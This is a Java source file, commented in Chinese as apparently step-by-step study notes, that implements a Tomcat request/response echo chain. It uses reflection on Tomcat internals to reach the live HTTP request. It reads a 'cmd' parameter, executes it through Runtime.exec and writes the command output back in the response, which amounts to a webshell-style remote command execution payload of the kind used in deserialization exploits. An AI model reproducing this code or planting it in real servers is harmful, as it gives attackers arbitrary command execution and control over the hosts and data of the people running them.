import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import javax.servlet.ServletException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.List;

public class HTTPResponse {
    public void GetRequestRespon() throws ServletException, IOException {
        /*
        WebappClassLoaderBase ---> ApplicationContext(getResources().getContext()) ---> StandardService--->Connector--->
        --->AbstractProtocol$ConnectoinHandler--->RequestGroupInfo(global)--->RequestInfo------->Request-------->Response。
         */
        //0x01 首先通过WebappClassLoaderBase来拿到StandardContext上下文
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        org.apache.catalina.core.StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

        try {
            //0x02 反射获取ApplicationContext上下文。抛出疑问1：为什么要拿这个上下文？
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext ApplicationContext = (ApplicationContext)context.get(standardContext);

            //0x03 反射获取StandardService类型的属性service的值
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (StandardService) service.get(ApplicationContext);

            //0x04 反射获取StandardService中的Connectors数组
            Field connectors = standardService.getClass().getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[]) connectors.get(standardService);

            //0x04 反射获取protocolHandler，为后续获取RequestGroupInfo数组作准备
            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);

            //0x05 反射获取AbstractProtocol list。抛出疑问2：为什么要用getDeclaredClasses()？
            Class<?>[] declaredClasses = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();

            //这里的classes数组为内置类，AbstractProtocol有两个内置类：ConnectionHandler、RecycledProcessors，我们需要的是ConnectionHandler
            for (Class<?> declaredClass : declaredClasses) {
                //通过全限定类名长度筛选出ConnectionHandler
                if (declaredClass.getName().length()==52){

                    // 0x06 获取getHandler方法，为后续获取global属性值：RequestGroupInfo数组作准备
                    java.lang.reflect.Method getHandler = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandler.setAccessible(true);

                    // 0x07 反射获取global属性值：RequestGroupInfo数组
                    Field global = declaredClass.getDeclaredField("global");
                    global.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (RequestGroupInfo) global.get(getHandler.invoke(connector[0].getProtocolHandler(), null));

                    // 0x08 反射获取RequestGroupInfo中processors，该属性值为元素类型为RequestInfo的List数组
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<org.apache.coyote.RequestInfo>  requestInfo = (List<RequestInfo>) processors.get(requestGroupInfo);

                    // 0x09 反射获取RequestInfo中的org.apache.coyote.Request类
                    Field req1 = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req1.setAccessible(true);

                    // 0x10 遍历RequestGroupInfo中processors的属性值，寻找需要的Request对象
                    for (RequestInfo info : requestInfo) {

                        org.apache.coyote.Request request = (Request) req1.get(info);
                        // 0x11 通过getNote()方法获取org.apache.catalina.connector.Request对象。抛出问题3：为什么要用org.apache.catalina.connector.Request对象？抛出问题4：为什么要用getNote方法获取？
                        org.apache.catalina.connector.Request request1 = (org.apache.catalina.connector.Request) request.getNote(1);
                        String cmd = request1.getParameter("cmd");
                        // 0x12 拿到response对象，回显链构造完毕
                        org.apache.catalina.connector.Response response = request1.getResponse();
                        PrintWriter out = response.getWriter();
                        try {
                            InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();
                            InputStreamReader isr = new InputStreamReader(is, "UTF-8");
                            BufferedReader br = new BufferedReader(isr);
                            String  line = br.readLine();
                            while (line != null){
                                out.println(line);
                                line = br.readLine();
                            }
                        } catch (IOException e) {
                            out.println("error!");
                        }
                    }
                }
            }
        } catch (Exception e) {

        }
    }
}
